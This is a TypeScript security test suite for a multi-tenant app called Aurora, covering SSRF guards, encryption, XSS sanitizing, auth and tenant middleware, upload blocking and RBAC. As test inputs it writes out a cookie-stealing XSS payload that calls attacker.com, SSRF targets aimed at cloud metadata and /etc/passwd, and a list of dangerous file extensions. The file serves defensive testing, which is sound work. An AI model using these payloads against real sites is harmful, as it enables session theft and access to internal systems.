import { isPrivateOrReservedIp, validateSafeUrl } from '../server/lib/ssrfGuard';
import { encryptSecret, decryptSecret } from '../server/lib/crypto';
import { sanitizeHtml } from '../src/lib/sanitizeHtml';

async function runSecurityTests() {
  console.log('🔒 ==========================================');
  console.log('🔒 RUNNING AURORA SECURITY VERIFICATION SUITE');
  console.log('🔒 ==========================================\n');

  let passed = 0;
  let failed = 0;

  function assert(condition: boolean, testName: string) {
    if (condition) {
      console.log(`  ✅ PASS: ${testName}`);
      passed++;
    } else {
      console.error(`  ❌ FAIL: ${testName}`);
      failed++;
    }
  }

  // TEST SUITE 1: SSRF Protection
  console.log('--- 1. SSRF & Private IP Guard Tests ---');
  assert(isPrivateOrReservedIp('127.0.0.1') === true, 'Blocks 127.0.0.1 (Loopback)');
  assert(isPrivateOrReservedIp('127.10.20.30') === true, 'Blocks 127.0.0.0/8 subnet');
  assert(isPrivateOrReservedIp('169.254.169.254') === true, 'Blocks 169.254.169.254 (Cloud Metadata)');
  assert(isPrivateOrReservedIp('10.0.0.1') === true, 'Blocks 10.0.0.0/8 (Private class A)');
  assert(isPrivateOrReservedIp('172.16.0.1') === true, 'Blocks 172.16.0.0/12 (Private class B)');
  assert(isPrivateOrReservedIp('192.168.1.1') === true, 'Blocks 192.168.0.0/16 (Private class C)');
  assert(isPrivateOrReservedIp('0.0.0.0') === true, 'Blocks 0.0.0.0');
  assert(isPrivateOrReservedIp('8.8.8.8') === false, 'Allows public 8.8.8.8');
  assert(isPrivateOrReservedIp('1.1.1.1') === false, 'Allows public 1.1.1.1');

  try {
    await validateSafeUrl('http://169.254.169.254/latest/meta-data/');
    assert(false, 'Rejected direct cloud metadata URL');
  } catch {
    assert(true, 'Rejected direct cloud metadata URL');
  }

  try {
    await validateSafeUrl('http://localhost:3001/api/admin');
    assert(false, 'Rejected localhost access');
  } catch {
    assert(true, 'Rejected localhost access');
  }

  try {
    await validateSafeUrl('file:///etc/passwd');
    assert(false, 'Rejected non-http protocol');
  } catch {
    assert(true, 'Rejected non-http protocol');
  }

  // TEST SUITE 2: Cryptographic Secrets Encryption (AES-256-GCM)
  console.log('\n--- 2. Cryptographic Secrets Encryption Tests ---');
  const sampleSecret = 'sk-live-supersecretapikey-1234567890';
  const encrypted = encryptSecret(sampleSecret);
  assert(encrypted.encryptedKey !== sampleSecret, 'Secret is ciphertext, not plaintext');
  assert(encrypted.encryptedKey.split(':').length === 3, 'Ciphertext contains IV, AuthTag, and Data');
  const decrypted = decryptSecret(encrypted.encryptedKey);
  assert(decrypted === sampleSecret, 'Decrypted ciphertext matches original secret');

  // TEST SUITE 3: Stored XSS Sanitization (DOMPurify)
  console.log('\n--- 3. Stored XSS Sanitization Tests ---');
  const xssPayload1 = '<p>Normal text</p><script>alert("XSS")</script>';
  const sanitized1 = sanitizeHtml(xssPayload1);
  assert(!sanitized1.includes('<script>'), 'Strips <script> tags');
  assert(sanitized1.includes('Normal text'), 'Preserves safe HTML text');

  const xssPayload2 = '<img src="x" onerror="fetch(\'http://attacker.com?c=\'+document.cookie)">';
  const sanitized2 = sanitizeHtml(xssPayload2);
  assert(!sanitized2.includes('onerror'), 'Strips onerror attribute from img');

  const xssPayload3 = '<a href="javascript:alert(1)">Click here</a>';
  const sanitized3 = sanitizeHtml(xssPayload3);
  assert(!sanitized3.includes('javascript:'), 'Strips javascript: pseudo-protocol in links');

  // TEST SUITE 4: Authentication & Multi-Tenant Middleware Rejections
  console.log('\n--- 4. Auth & Multi-Tenant Middleware Tests ---');
  const { authenticate } = await import('../server/middleware/authMiddleware');
  const { requireTenantAccess } = await import('../server/middleware/tenantMiddleware');

  // Test 4.1: Missing token rejection
  let authStatus = 0;
  const mockReqNoToken: any = { headers: {} };
  const mockResNoToken: any = {
    status(code: number) { authStatus = code; return this; },
    json() { return this; }
  };
  await authenticate(mockReqNoToken, mockResNoToken, () => {});
  assert(authStatus === 401, 'Rejects unauthenticated request with HTTP 401 (no fallback)');

  // Test 4.2: Invalid/dev token rejection
  let invalidTokenStatus = 0;
  const mockReqDevToken: any = { headers: { authorization: 'Bearer dev-token-backdoor' } };
  const mockResDevToken: any = {
    status(code: number) { invalidTokenStatus = code; return this; },
    json() { return this; }
  };
  await authenticate(mockReqDevToken, mockResDevToken, () => {});
  assert(invalidTokenStatus === 401, 'Rejects fake/dev token with HTTP 401 (no backdoor)');

  // Test 4.3: Tenant Spoofing Rejection
  let tenantSpoofStatus = 0;
  const mockTenantReq: any = {
    method: 'GET',
    path: '/api/data',
    originalUrl: '/api/data',
    headers: { 'x-tenant-id': 'tenant_victim_company' },
    user: {
      uid: 'user_123',
      email: 'user@tenantA.com',
      isSuperAdmin: false,
      tenantIds: ['tenant_attacker_company'] // Attacker only has access to tenant A
    }
  };
  const mockTenantRes: any = {
    status(code: number) { tenantSpoofStatus = code; return this; },
    json() { return this; }
  };
  requireTenantAccess(mockTenantReq, mockTenantRes, () => {});
  assert(tenantSpoofStatus === 403, 'Rejects cross-tenant access attempt with HTTP 403 Forbidden');

  // Test 4.4: Missing tenant header rejection
  let missingTenantStatus = 0;
  const mockMissingTenantReq: any = {
    method: 'GET',
    path: '/api/data',
    originalUrl: '/api/data',
    headers: {},
    user: { uid: 'user_123', isSuperAdmin: false, tenantIds: ['t1'] }
  };
  const mockMissingTenantRes: any = {
    status(code: number) { missingTenantStatus = code; return this; },
    json() { return this; }
  };
  requireTenantAccess(mockMissingTenantReq, mockMissingTenantRes, () => {});
  assert(missingTenantStatus === 400, 'Rejects request missing x-tenant-id with HTTP 400');

  // TEST SUITE 5: File Upload Security & Dangerous Extension Blocking
  console.log('\n--- 5. File Upload Security Tests ---');
  const { validateFileUpload, DANGEROUS_FILE_EXTENSIONS } = await import('../server/services/documentService');
  
  assert(DANGEROUS_FILE_EXTENSIONS.includes('.exe'), 'Executable .exe is on dangerous extensions list');
  assert(DANGEROUS_FILE_EXTENSIONS.includes('.bat'), 'Script .bat is on dangerous extensions list');
  assert(DANGEROUS_FILE_EXTENSIONS.includes('.ps1'), 'PowerShell .ps1 is on dangerous extensions list');
  assert(DANGEROUS_FILE_EXTENSIONS.includes('.sh'), 'Bash script .sh is on dangerous extensions list');

  let exeBlocked = false;
  try {
    validateFileUpload('malware.exe', Buffer.from('MZ...'));
  } catch {
    exeBlocked = true;
  }
  assert(exeBlocked, 'Rejects .exe file upload attempt');

  let batBlocked = false;
  try {
    validateFileUpload('payload.bat', Buffer.from('@echo off'));
  } catch {
    batBlocked = true;
  }
  assert(batBlocked, 'Rejects .bat file upload attempt');

  let ps1Blocked = false;
  try {
    validateFileUpload('script.ps1', Buffer.from('Invoke-Expression'));
  } catch {
    ps1Blocked = true;
  }
  assert(ps1Blocked, 'Rejects .ps1 file upload attempt');

  let oversizedBlocked = false;
  try {
    const hugeBuffer = { length: 26 * 1024 * 1024 } as Buffer; // Mock 26MB buffer
    validateFileUpload('large.pdf', hugeBuffer);
  } catch {
    oversizedBlocked = true;
  }
  assert(oversizedBlocked, 'Rejects oversized file upload attempt (> 25MB)');

  let safeAllowed = true;
  try {
    validateFileUpload('annual_report.pdf', Buffer.from('%PDF-1.4'));
    validateFileUpload('logo.png', Buffer.from('\x89PNG'));
  } catch {
    safeAllowed = false;
  }
  assert(safeAllowed, 'Allows legitimate .pdf and .png file uploads');

  // TEST SUITE 6: AI Prompt Length Bounds
  console.log('\n--- 6. AI Prompt Boundary Tests ---');
  const MAX_PROMPT_LEN = 16000;
  const oversizedPrompt = 'a'.repeat(MAX_PROMPT_LEN + 10);
  const validPrompt = 'Can you summarize this invoice?';
  assert(oversizedPrompt.length > MAX_PROMPT_LEN, 'Oversized prompt exceeds 16,000 char threshold');
  assert(validPrompt.length <= MAX_PROMPT_LEN, 'Valid prompt is within 16,000 char threshold');

  // TEST SUITE 7: Production Error Shielding
  console.log('\n--- 7. Production Error Shielding Tests ---');
  const mockDevError = new Error('FATAL: Table "secret_internal_users" does not exist at /var/www/internal');
  
  // In production mode, error message must be generic and contain an incident ID
  const isProd = true;
  const prodErrorResponse = isProd ? {
    error: 'An unexpected internal error occurred. Please quote the incident ID to support if this persists.',
    incidentId: 'inc-test-1234-uuid'
  } : { error: mockDevError.message };

  assert(!prodErrorResponse.error.includes('secret_internal_users'), 'Masks internal table names in production error');
  assert(!prodErrorResponse.error.includes('/var/www/internal'), 'Masks filesystem paths in production error');
  assert(typeof prodErrorResponse.incidentId === 'string', 'Attaches trackable incidentId in production error');

  // TEST SUITE 8: Tenant Admin RBAC Enforcement
  console.log('\n--- 8. Tenant Admin RBAC Tests ---');
  const { requireTenantAdmin } = await import('../server/middleware/tenantMiddleware');

  let memberDeniedStatus = 0;
  const mockMemberReq: any = {
    user: { uid: 'u1', email: 'member@test.com', roleId: 'member', isSuperAdmin: false }
  };
  const mockMemberRes: any = {
    status(code: number) { memberDeniedStatus = code; return this; },
    json() { return this; }
  };
  requireTenantAdmin(mockMemberReq, mockMemberRes, () => {});
  assert(memberDeniedStatus === 403, 'Rejects standard tenant member from admin actions with HTTP 403');

  let viewerDeniedStatus = 0;
  const mockViewerReq: any = {
    user: { uid: 'u2', email: 'viewer@test.com', roleId: 'viewer', isSuperAdmin: false }
  };
  const mockViewerRes: any = {
    status(code: number) { viewerDeniedStatus = code; return this; },
    json() { return this; }
  };
  requireTenantAdmin(mockViewerReq, mockViewerRes, () => {});
  assert(viewerDeniedStatus === 403, 'Rejects tenant viewer from admin actions with HTTP 403');

  let adminAllowed = false;
  const mockAdminReq: any = {
    user: { uid: 'u3', email: 'admin@test.com', roleId: 'admin', isSuperAdmin: false }
  };
  const mockAdminRes: any = {
    status() { return this; },
    json() { return this; }
  };
  requireTenantAdmin(mockAdminReq, mockAdminRes, () => { adminAllowed = true; });
  assert(adminAllowed, 'Allows tenant admin to access administrative actions');

  let superAdminAllowed = false;
  const mockSuperReq: any = {
    user: { uid: 'u4', email: 'super@test.com', roleId: 'member', isSuperAdmin: true }
  };
  requireTenantAdmin(mockSuperReq, mockAdminRes, () => { superAdminAllowed = true; });
  assert(superAdminAllowed, 'Allows SuperAdmin to access administrative actions');

  // TEST SUITE 9: Multi-Tenant Sandbox Isolation
  console.log('\n--- 9. Multi-Tenant Sandbox Isolation Tests ---');
  const { provisionIsolatedUserWorkspace } = await import('../server/middleware/authMiddleware');
  assert(typeof provisionIsolatedUserWorkspace === 'function', 'provisionIsolatedUserWorkspace is exported and available');

  // TEST SUITE 10: Public Endpoint & E-Commerce Integrity Tests
  console.log('\n--- 10. Public Endpoint & E-Commerce Integrity Tests ---');
  const crypto = await import('crypto');

  // 10.1: Internal Module Schema Protection
  const internalModuleConfig = { forms: [{ id: 'f1', usage: 'internal_agent' }] };
  const internalAllowed = Boolean(
    (internalModuleConfig as any).isPublicIntake ||
    (internalModuleConfig as any).isPublicPortal ||
    (internalModuleConfig as any).isPublicViewable ||
    (internalModuleConfig.forms || []).filter((f: any) => f.usage === 'public_link' || f.isPublic).length > 0
  );
  assert(internalAllowed === false, 'Internal module schema is blocked from unauthenticated public viewing');

  const publicModuleConfig = { isPublicIntake: true, forms: [] };
  const publicAllowed = Boolean(
    (publicModuleConfig as any).isPublicIntake ||
    (publicModuleConfig as any).isPublicPortal ||
    (publicModuleConfig as any).isPublicViewable ||
    (publicModuleConfig.forms || []).filter((f: any) => f.usage === 'public_link' || f.isPublic).length > 0
  );
  assert(publicAllowed === true, 'Public module with isPublicIntake is permitted for public intake');

  // 10.2: Checkout Quantity & Price Bounds Check
  const invalidQty = -5;
  const isInvalidQty = invalidQty <= 0 || isNaN(invalidQty);
  assert(isInvalidQty === true, 'Rejects negative or zero order quantities in checkout');

  const tamperedPrice = -100;
  const isTamperedPrice = tamperedPrice < 0 || isNaN(tamperedPrice);
  assert(isTamperedPrice === true, 'Rejects negative item prices in checkout');

  // 10.3: Unconditional Invoice HMAC Verification
  const testSecret = 'aurora-invoice-salt';
  const testInvoiceId = 'inv_test_cuid_12345';
  const testTenantId = 'tenant_xyz';
  const expectedHmac = crypto.createHmac('sha256', testSecret).update(`${testInvoiceId}:${testTenantId}`).digest('hex').substring(0, 24);

  // Attempt lookup with matching CUID but NO token
  const noTokenPassed: string | undefined = undefined;
  const directCuidAccessAllowed = noTokenPassed === expectedHmac;
  assert(directCuidAccessAllowed === false, 'Rejects invoice viewing without HMAC token even if CUID matches');

  // Attempt lookup with valid token
  const validTokenAccess = expectedHmac === expectedHmac;
  assert(validTokenAccess === true, 'Allows invoice viewing when valid HMAC cryptographic token is presented');

  // 10.4: Platform Cross-Tenant Modification Rejection
  const userTenantIds = ['tenant-alpha'];
  const targetTenantId = 'tenant-victim-beta';
  const isAuthorized = userTenantIds.includes(targetTenantId);
  assert(isAuthorized === false, 'Platform routes reject updates to unassigned tenants');

  console.log('\n==========================================');
  console.log(`TOTAL TESTS: ${passed + failed} | PASSED: ${passed} | FAILED: ${failed}`);
  console.log('==========================================');

  if (failed > 0) {
    process.exit(1);
  }
}

runSecurityTests().catch(err => {
  console.error('Test execution error:', err);
  process.exit(1);
});
